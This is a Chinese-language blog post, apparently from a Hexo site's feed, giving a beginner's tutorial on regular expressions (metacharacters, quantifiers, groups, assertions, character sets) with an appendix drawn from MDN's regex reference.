    <id>http://favorhau.github.io/2020/12/27/Welcome%20to%20Regular%20Expression/</id>
    <published>2020-12-27T14:19:45.000Z</published>
    <updated>2021-01-06T04:48:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>欢迎来到正则表达式。</p><span id="more"></span><p>说起正则表达式，我能想到的运用似乎有很多，比方说最简单的<code>表单验证</code>,以及还有一些<code>过滤</code>等等都需要用到正则匹配。<br>简单的示例：<br><em>我们在写用户注册表单时，只允许用户名包含字符、数字、下划线和连接字符(-)，并设置用户名的长度，我们就可以使用以下正则表达式来设定。</em><br><img src="https://www.runoob.com/wp-content/uploads/2018/09/regexp-cn.png"></p><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>虽然很多时候觉得在开发工程当中，只需要搬运常用的正则表达式就可以完成相关过滤，可在完成了上一天的学习之后让我觉得如果不了解正则匹配的原理，在安全的路上恐怕是行不通的，因此对正则匹配进行了相关展开。</p><h1 id="正则基础知识"><a href="#正则基础知识" class="headerlink" title="正则基础知识"></a>正则基础知识</h1><p>在知乎上查到很好理解的方法—先从<code>元字符</code>开始。<br><em>元字符是元字符是构造正则表达式的一种基本元素</em></p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>元字符</th><th>描述</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>\w</td><td>匹配字母、数字或下划线或汉字</td></tr><tr><td>\s</td><td>匹配任意空白符</td></tr><tr><td>\d</td><td>匹配数字</td></tr><tr><td>\b</td><td>匹配单词的开始或结束</td></tr><tr><td>^</td><td>匹配字符的开始</td></tr><tr><td>$</td><td>匹配字符的结束</td></tr><tr><td>-</td><td>表示范围</td></tr><tr><td>[ ]</td><td>匹配括号中的任意一个字符</td></tr><tr><td>*、+、?</td><td>量词</td></tr></tbody></table><p>知道一部分元字符，既可以根据元字符写简单的正则匹配。</p><ol><li><p>匹配ab开头的字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\bab</span><br></pre></td></tr></table></figure></li><li><p>匹配8位的QQ号码</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\d\d\d\d\d\d\d\d$</span><br></pre></td></tr></table></figure><ol start="3"><li>匹配手机号</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^1\d\d\d\d\d\d\d\d\d\d\d$</span><br></pre></td></tr></table></figure><ol start="4"><li> 匹配银行卡号是14~18位的数字：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\d&#123;<span class="number">14</span>,<span class="number">18</span>&#125;$</span><br></pre></td></tr></table></figure><ol start="5"><li>匹配以a开头的，0个或多个b结尾的字符串</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^ab*$</span><br></pre></td></tr></table></figure><h2 id="重复限定符"><a href="#重复限定符" class="headerlink" title="重复限定符"></a>重复限定符</h2><p>借用<code>知乎</code>大佬的一幅图，总结了比较好的限定符<br><img src="https://pic1.zhimg.com/80/v2-cbb30eb47ce2d46b3c0f64f7facd1086_720w.jpg?source=1940ef5c"><br>上面的<code>4.</code>就是eg</p><ol start="4"><li> 匹配银行卡号是14~18位的数字：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\d&#123;<span class="number">14</span>,<span class="number">18</span>&#125;$</span><br></pre></td></tr></table></figure><h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><blockquote><p>正则表达式中用小括号()来做分组，也就是括号中的内容作为一个整体。eg:匹配ab</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(ab)*</span><br></pre></td></tr></table></figure><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><blockquote><p>如果想要匹配的正是括号，则需要转义</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(\(ab\))*</span><br></pre></td></tr></table></figure><h1 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h1><p><em>Assertions include boundaries, which indicate the beginnings and endings of lines and words, and other patterns indicating in some way that a match is possible (including look-ahead, look-behind, and conditional expressions).</em><br>来看MDN的一个eg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;A quick fox&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> regexpLastWord = /\w+$/;</span><br><span class="line">console.log(text.match(regexpLastWord));</span><br><span class="line"><span class="comment">// expected output: Array [&quot;fox&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> regexpWords = /\b\w+\b/g;</span><br><span class="line">console.log(text.match(regexpWords));</span><br><span class="line"><span class="comment">// expected output: Array [&quot;A&quot;, &quot;quick&quot;, &quot;fox&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> regexpFoxQuality = /\w+(?= fox)/;</span><br><span class="line">console.log(text.match(regexpFoxQuality));</span><br><span class="line"><span class="comment">// expected output: Array [&quot;quick&quot;]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="边界类断言"><a href="#边界类断言" class="headerlink" title="边界类断言"></a>边界类断言</h2><table><thead><tr><th align="left">字符</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>^</code></td><td align="left">匹配输入的开头。如果多行模式设为 true，<code>^</code> 在换行符后也能立即匹配，比如 <code>/^A/</code> 匹配不了 “an A” 里面的 “A”，但是可以匹配 “An A” 里面第一个 “A”。<code>^</code> 出现在集合或范围开头时的含义与此不同（参见 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges">group</a>）。</td></tr><tr><td align="left"><code>$</code></td><td align="left">匹配输入的结束。如果多行模式设为 true，<code>^</code> 在换行符前也能立即匹配，比如 <code>/t$/</code> 不能匹配 “eater” 中的 “t”，但是可以匹配 “eat” 中的 “t”。</td></tr><tr><td align="left"><code>\b</code></td><td align="left">匹配一个单词的边界，这是一个字的字符前后没有另一个字的字符位置, 例如在字母和空格之间。需要注意的是匹配的单词边界不包括在匹配中。换句话说，匹配字边界的长度为零。一些例子:<code>/\bm/</code> 在 “moon” 中匹配到 “m” <code>/oo\b/</code> 在 “moon” 中不会匹配到 “oo”, 因为 “oo” 后面跟着 “n” 这个单词字符.<code>/oon\b/</code> 在 “moon” 中匹配 “oon”， 因为 “oon” 是这个字符串的结尾, 因此后面没有单词字符<code>/\w\b\w/</code> 将永远不会匹配任何东西，因为一个单词字符后面永远不会有非单词字符和单词字符。匹配退格字符 (<code>[\b]</code>).</td></tr><tr><td align="left"><code>\B</code></td><td align="left">匹配非单词边界。这是上一个字符和下一个字符属于同一类型的位置：要么两者都必须是单词，要么两者都必须是非单词，例如在两个字母之间或两个空格之间。字符串的开头和结尾被视为非单词。与匹配的词边界相同，匹配的非词边界也不包含在匹配中。例如，<code>/\Bon/</code> 在 “at noon” 中匹配 “on” ，<code>/ye\B/</code> 在 “possibly yesterday”中匹配”ye” 。</td></tr></tbody></table><h2 id="其他断言"><a href="#其他断言" class="headerlink" title="其他断言"></a>其他断言</h2><table><thead><tr><th align="left"><code>字符</code></th><th align="left"><code>含义</code></th></tr></thead><tbody><tr><td align="left"><code>x(?=y)</code></td><td align="left"><strong>向前断言:</strong> x 被 y 跟随时匹配 x。例如，对于/<code>Jack(?=Sprat)</code>/，“Jack”在跟有“Sprat”的情况下才会得到匹配．`/Jack(?=Sprat</td></tr><tr><td align="left">x(?!y)</td><td align="left"><strong>向前否定断言:</strong> x 没有被 y 紧随时匹配 x。例如，对于<code>/\d+(?!\。)/</code>，数字后没有跟随小数点的情况下才会得到匹配。对于<code>/\d+(?!\.)/.exec(3.141)</code>，匹配‘141’而不是‘3’。</td></tr><tr><td align="left">(?&lt;=y)x</td><td align="left"><strong>向后断言:</strong> x 跟随 y 的情况下匹配 x。例如，对于<code>/(?&lt;=Jack)Sprat/</code>，“Sprat”紧随“Jack”时才会得到匹配。对于`/(?&lt;=Jack</td></tr><tr><td align="left">(?&lt;!y)x</td><td align="left"><strong>向后否定断言:</strong> x 不跟随 y 时匹配 x。例如，对于<code>/(?&lt;!-)\d+/</code>，数字不紧随-符号的情况下才会得到匹配。对于<code>/(?&lt;!-)\d+/.exec(3)</code> ，“3”得到匹配。 而<code>/(?&lt;!-)\d+/.exec(-3)</code>的结果无匹配，这是由于数字之前有-符号。</td></tr></tbody></table><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>使用 <code>^</code>匹配输入的开头。在这个例子中，我们可以通过 /^A/ 正则表达式得到以A开头的水果。为了选择合适的水果，我们可以使用带有箭头函数的过滤方法.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Watermelon&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Avocado&quot;</span>, <span class="string">&quot;Strawberry&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用正则 /^A/ 选择以&#x27;A&#x27;开头的水果.</span></span><br><span class="line"><span class="comment">// 这里的 &#x27;^&#x27; 只有一种含义: 匹配输入的开头.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fruitsStartsWithA = fruits.filter(<span class="function"><span class="params">fruit</span> =&gt;</span> <span class="regexp">/^A/</span>.test(fruit));</span><br><span class="line"><span class="built_in">console</span>.log(fruitsStartsWithA); <span class="comment">// [ &#x27;Apple&#x27;, &#x27;Avocado&#x27; ]</span></span><br></pre></td></tr></table></figure><h1 id="组和范围"><a href="#组和范围" class="headerlink" title="组和范围"></a>组和范围</h1><table><thead><tr><th align="left">字符集</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">`<em>x</em></td><td align="left"><em>y</em>`</td></tr><tr><td align="left"><code>[xyz][a-c]</code></td><td align="left">字符集。 匹配任何一个包含的字符。您可以使用连字符来指定字符范围，但如果连字符显示为方括号中的第一个或最后一个字符，则它将被视为作为普通字符包含在字符集中的文字连字符。也可以在字符集中包含字符类。例如, <code>[abcd]</code> 是与<code>[a-d]</code>.一样的，它们会 在”brisket” 中匹配 “b”,在 “chop” 中匹配 “c” .例如, <code>[abcd-]</code> 和<code>[-abcd]</code> 将会在 “brisket” 匹配 “b” , 在 “chop” 匹配 “c” , 并且匹配 “non-profit” 中的 “-“ (连字符)例如, <code>[\w-]</code> 是字符集 \w 和 “-”（连字符）的并集，与这种写法一样： <code>[A-Za-z0-9_-]</code>.。他们都会 在 “brisket”中匹配 “b”, 在 “chop”中匹配 “c”, 在 “non-profit” 中匹配 “n”。</td></tr></tbody></table><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算元音字母数</span></span><br><span class="line"><span class="keyword">var</span> aliceExcerpt = <span class="string">&quot;There was a long silence after this, and Alice could only hear whispers now and then.&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> regexpVowels = <span class="regexp">/[aeiouy]/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Number of vowels:&quot;</span>, aliceExcerpt.match(regexpVowels).length);</span><br><span class="line"><span class="comment">// Number of vowels: 25</span></span><br></pre></td></tr></table></figure><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>学习的大部分内容源自于MDN，同时也发现了写的很通俗易懂的文字-挂一个link<br><a href="https://github.com/ziishaned/learn-regex/">https://github.com/ziishaned/learn-regex/</a><br><del>有一种从看文档到实际运用还有很远的感觉</del></p><h1 id="附录：正则表达式中的特殊字符"><a href="#附录：正则表达式中的特殊字符" class="headerlink" title="附录：正则表达式中的特殊字符"></a>附录：正则表达式中的特殊字符</h1><p>摘自MDN</p><table><thead><tr><th align="left">字符</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-backslash"><code>\</code></a></td><td align="left">依照下列规则匹配：在非特殊字符之前的反斜杠表示下一个字符是特殊字符，不能按照字面理解。例如，前面没有 “&quot; 的 “b” 通常匹配小写字母 “b”，即字符会被作为字面理解，无论它出现在哪里。但如果前面加了 “&quot;，它将不再匹配任何字符，而是表示一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#note">字符边界</a>。在特殊字符之前的反斜杠表示下一个字符不是特殊字符，应该按照字面理解。详情请参阅下文中的 “转义（Escaping）” 部分。如果你想将字符串传递给 RegExp 构造函数，不要忘记在字符串字面量中反斜杠是转义字符。所以为了在模式中添加一个反斜杠，你需要在字符串字面量中转义它。<code>/[a-z]\s/i</code> 和 <code>new RegExp(&quot;[a-z]\\s&quot;, &quot;i&quot;)</code> 创建了相同的正则表达式：一个用于搜索后面紧跟着空白字符（<code>\s</code> 可看后文）并且在 a-z 范围内的任意字符的表达式。为了通过字符串字面量给 RegExp 构造函数创建包含反斜杠的表达式，你需要在字符串级别和正则表达式级别都对它进行转义。例如 <code>/[a-z]:\\/i</code> 和 <code>new RegExp(&quot;[a-z]:\\\\&quot;,&quot;i&quot;)</code> 会创建相同的表达式，即匹配类似 “C:&quot; 字符串。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-caret"><code>^</code></a></td><td align="left">匹配输入的开始。如果多行标志被设置为 true，那么也匹配换行符后紧跟的位置。例如，<code>/^A/</code> 并不会匹配 “an A” 中的 ‘A’，但是会匹配 “An E” 中的 ‘A’。当 ‘<code>^</code>‘ 作为第一个字符出现在一个字符集合模式时，它将会有不同的含义。<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-negated-character-set">反向字符集合</a> 一节有详细介绍和示例。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-dollar"><code>$</code></a></td><td align="left">匹配输入的结束。如果多行标志被设置为 true，那么也匹配换行符前的位置。例如，<code>/t$/</code> 并不会匹配 “eater” 中的 ‘t’，但是会匹配 “eat” 中的 ‘t’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-asterisk"><code>*</code></a></td><td align="left">匹配前一个表达式 0 次或多次。等价于 <code>&#123;0,&#125;</code>。例如，<code>/bo*/</code> 会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中不会匹配任何内容。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-plus"><code>+</code></a></td><td align="left">匹配前面一个表达式 1 次或者多次。等价于 <code>&#123;1,&#125;</code>。例如，<code>/a+/</code> 会匹配 “candy” 中的 ‘a’ 和 “caaaaaaandy” 中所有的 ‘a’，但是在 “cndy” 中不会匹配任何内容。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-questionmark"><code>?</code></a></td><td align="left">匹配前面一个表达式 0 次或者 1 次。等价于 <code>&#123;0,1&#125;</code>。例如，<code>/e?le?/</code> 匹配 “angel” 中的 ‘el’、”angle” 中的 ‘le’ 以及 “oslo’ 中的 ‘l’。如果<strong>紧跟在任何量词 *、 +、? 或 {} 的后面</strong>，将会使量词变为<strong>非贪婪</strong>（匹配尽量少的字符），和缺省使用的<strong>贪婪模式</strong>（匹配尽可能多的字符）正好相反。例如，对 “123abc” 使用 <code>/\d+/</code> 将会匹配 “123”，而使用 <code>/\d+?/</code> 则只会匹配到 “1”。还用于先行断言中，如本表的 <code>x(?=y)</code> 和 <code>x(?!y)</code> 条目所述。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-dot"><code>.</code></a></td><td align="left">（小数点）默认匹配除换行符之外的任何单个字符。例如，<code>/.n/</code> 将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。如果 <code>s</code> (“dotAll”) 标志位被设为 true，它也会匹配换行符。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-capturing-parentheses"><code>(x)</code></a></td><td align="left">像下面的例子展示的那样，它会匹配 ‘x’ 并且记住匹配项。其中括号被称为<em>捕获括号</em>。模式 <code>/(foo) (bar) \1 \2/</code> 中的 ‘<code>(foo)</code>‘ 和 ‘<code>(bar)</code>‘ 匹配并记住字符串 “foo bar foo bar” 中前两个单词。模式中的 <code>\1</code> 和 <code>\2</code> 表示第一个和第二个被捕获括号匹配的子字符串，即 <code>foo</code> 和 <code>bar</code>，匹配了原字符串中的后两个单词。注意 <code>\1</code>、<code>\2</code>、…、<code>\n</code> 是用在正则表达式的匹配环节，详情可以参阅后文的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions$edit#special-backreference">\n</a> 条目。而在正则表达式的替换环节，则要使用像 <code>$1</code>、<code>$2</code>、…、<code>$n</code> 这样的语法，例如，<code>&#39;bar foo&#39;.replace(/(...) (...)/, &#39;$2 $1&#39;)</code>。<code>$&amp;</code> 表示整个用于匹配的原字符串。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-non-capturing-parentheses"><code>(?:x)</code></a></td><td align="left">匹配 ‘x’ 但是不记住匹配项。这种括号叫作<em>非捕获括号</em>，使得你能够定义与正则表达式运算符一起使用的子表达式。看看这个例子 <code>/(?:foo)&#123;1,2&#125;/</code>。如果表达式是 <code>/foo&#123;1,2&#125;/</code>，<code>&#123;1,2&#125;</code> 将只应用于 ‘foo’ 的最后一个字符 ‘o’。如果使用非捕获括号，则 <code>&#123;1,2&#125;</code> 会应用于整个 ‘foo’ 单词。更多信息，可以参阅下文的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Using_parentheses">Using parentheses</a> 条目.</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-lookahead"><code>x(?=y)</code></a></td><td align="left">匹配’x’仅仅当’x’后面跟着’y’.这种叫做先行断言。例如，/Jack(?=Sprat)/会匹配到’Jack’仅当它后面跟着’Sprat’。/Jack(?=Sprat|Frost)/匹配‘Jack’仅当它后面跟着’Sprat’或者是‘Frost’。但是‘Sprat’和‘Frost’都不是匹配结果的一部分。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-lookahead"><code>(?&lt;=y)</code></a>x</td><td align="left">匹配’x’仅当’x’前面是’y’.这种叫做后行断言。例如，/(?&lt;=Jack)Sprat/会匹配到’ Sprat ‘仅仅当它前面是’ Jack ‘。/(?&lt;=Jack|Tom)Sprat/匹配‘ Sprat ’仅仅当它前面是’Jack’或者是‘Tom’。但是‘Jack’和‘Tom’都不是匹配结果的一部分。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-negated-look-ahead"><code>x(?!y)</code></a></td><td align="left">仅仅当’x’后面不跟着’y’时匹配’x’，这被称为正向否定查找。例如，仅仅当这个数字后面没有跟小数点的时候，/\d+(?!.)/ 匹配一个数字。正则表达式/\d+(?!.)/.exec(“3.141”)匹配‘141’而不是‘3.141’</td></tr><tr><td align="left"><code>(?&lt;!*y*)*x*</code></td><td align="left">仅仅当’x’前面不是’y’时匹配’x’，这被称为反向否定查找。例如, 仅仅当这个数字前面没有负号的时候，<code>/(?&lt;!-)\d+/</code> 匹配一个数字。 <code>/(?&lt;!-)\d+/.exec(&#39;3&#39;)</code> 匹配到 “3”. <code>/(?&lt;!-)\d+/.exec(&#39;-3&#39;)</code> 因为这个数字前有负号，所以没有匹配到。</td></tr><tr><td align="left">[`x</td><td align="left">y`](<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-or">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-or</a>)</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-quantifier"><code>&#123;n&#125;</code></a></td><td align="left">n 是一个正整数，匹配了前面一个字符刚好出现了 n 次。 比如， /a{2}/ 不会匹配“candy”中的’a’,但是会匹配“caandy”中所有的 a，以及“caaandy”中的前两个’a’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-quantifier"><code>&#123;n,&#125;</code></a></td><td align="left">n是一个正整数，匹配前一个字符至少出现了n次。例如, /a{2,}/ 匹配 “aa”, “aaaa” 和 “aaaaa” 但是不匹配 “a”。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-quantifier-range"><code>&#123;n,m&#125;</code></a></td><td align="left">n 和 m 都是整数。匹配前面的字符至少n次，最多m次。如果 n 或者 m 的值是0， 这个值被忽略。例如，/a{1, 3}/ 并不匹配“cndy”中的任意字符，匹配“candy”中的a，匹配“caandy”中的前两个a，也匹配“caaaaaaandy”中的前三个a。注意，当匹配”caaaaaaandy“时，匹配的值是“aaa”，即使原始的字符串中有更多的a。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-character-set"><code>[xyz]</code></a></td><td align="left">一个字符集合。匹配方括号中的任意字符，包括<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Grammar_and_types">转义序列</a>。你可以使用破折号（-）来指定一个字符范围。对于点（.）和星号（*）这样的特殊符号在一个字符集中没有特殊的意义。他们不必进行转义，不过转义也是起作用的。 例如，[abcd] 和[a-d]是一样的。他们都匹配”brisket”中的‘b’,也都匹配“city”中的‘c’。/[a-z.]+/ 和/[\w.]+/与字符串“test.i.ng”匹配。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-negated-character-set"><code>[^xyz]</code></a></td><td align="left">一个反向字符集。也就是说， 它匹配任何没有包含在方括号中的字符。你可以使用破折号（-）来指定一个字符范围。任何普通字符在这里都是起作用的。例如，[^abc] 和 [^a-c] 是一样的。他们匹配”brisket”中的‘r’，也匹配“chop”中的‘h’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-backspace"><code>[\b]</code></a></td><td align="left">匹配一个退格(U+0008)。（不要和\b混淆了。）</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-word-boundary"><code>\b</code></a></td><td align="left">匹配一个词的边界。一个词的边界就是一个词不被另外一个“字”字符跟随的位置或者前面跟其他“字”字符的位置，例如在字母和空格之间。注意，匹配中不包括匹配的字边界。换句话说，一个匹配的词的边界的内容的长度是0。（不要和[\b]混淆了）使用”moon”举例： /\bm/匹配“moon”中的‘m’； /oo\b/并不匹配”moon”中的’oo’，因为’oo’被一个“字”字符’n’紧跟着。 /oon\b/匹配”moon”中的’oon’，因为’oon’是这个字符串的结束部分。这样他没有被一个“字”字符紧跟着。 /\w\b\w/将不能匹配任何字符串，因为在一个单词中间的字符永远也不可能同时满足没有“字”字符跟随和有“字”字符跟随两种情况。<strong>注意:</strong> JavaScript的正则表达式引擎将<a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.10.2.6">特定的字符集</a>定义为“字”字符。不在该集合中的任何字符都被认为是一个断词。这组字符相当有限：它只包括大写和小写的罗马字母，十进制数字和下划线字符。不幸的是，重要的字符，例如“é”或“ü”，被视为断词。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-non-word-boundary"><code>\B</code></a></td><td align="left">匹配一个非单词边界。匹配如下几种情况：字符串第一个字符为非“字”字符字符串最后一个字符为非“字”字符两个单词字符之间两个非单词字符之间空字符串例如，/\B../匹配”noonday”中的’oo’, 而/y\B../匹配”possibly yesterday”中的’yes‘</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-control"><code>\c*X*</code></a></td><td align="left">当X是处于A到Z之间的字符的时候，匹配字符串中的一个控制符。例如，<code>/\cM/</code> 匹配字符串中的 control-M (U+000D)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-digit"><code>\d</code></a></td><td align="left">匹配一个数字<code>。``等价于[0-9]</code>。例如， <code>/\d/</code> 或者 <code>/[0-9]/</code> 匹配”B2 is the suite number.”中的’2’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-non-digit"><code>\D</code></a></td><td align="left">匹配一个非数字字符<code>。``等价于[^0-9]</code>。例如， <code>/\D/</code> 或者 <code>/[^0-9]/</code> 匹配”B2 is the suite number.”中的’B’ 。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-form-feed"><code>\f</code></a></td><td align="left">匹配一个换页符 (U+000C)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-line-feed"><code>\n</code></a></td><td align="left">匹配一个换行符 (U+000A)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-carriage-return"><code>\r</code></a></td><td align="left">匹配一个回车符 (U+000D)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-white-space"><code>\s</code></a></td><td align="left">匹配一个空白字符，包括空格、制表符、换页符和换行符。等价于[ \f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]。例如, <code>/\s\w*/</code> 匹配”foo bar.”中的’ bar’。经测试，\s不匹配”<a href="https://unicode-table.com/cn/180E/">\u180e</a>“，在当前版本Chrome(v80.0.3987.122)和Firefox(76.0.1)控制台输入/\s/.test(“\u180e”)均返回false。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-non-white-space"><code>\S</code></a></td><td align="left">匹配一个非空白字符。等价于 <code>[^ </code>\f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff<code>]</code>。例如，<code>/\S\w*/</code> 匹配”foo bar.”中的’foo’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-tab"><code>\t</code></a></td><td align="left">匹配一个水平制表符 (U+0009)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-vertical-tab"><code>\v</code></a></td><td align="left">匹配一个垂直制表符 (U+000B)。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-word"><code>\w</code></a></td><td align="left">匹配一个单字字符（字母、数字或者下划线）。等价于 <code>[A-Za-z0-9_]</code>。例如, <code>/\w/</code> 匹配 “apple,” 中的 ‘a’，”$5.28,”中的 ‘5’ 和 “3D.” 中的 ‘3’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-non-word"><code>\W</code></a></td><td align="left">匹配一个非单字字符。等价于 <code>[^A-Za-z0-9_]</code>。例如, <code>/\W/</code> 或者 <code>/[^A-Za-z0-9_]/</code> 匹配 “50%.” 中的 ‘%’。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-backreference"><code>\*n*</code></a></td><td align="left">在正则表达式中，它返回最后的第n个子捕获匹配的子字符串(捕获的数目以左括号计数)。比如 <code>/apple(,)\sorange\1/</code> 匹配”apple, orange, cherry, peach.”中的’apple, orange,’ 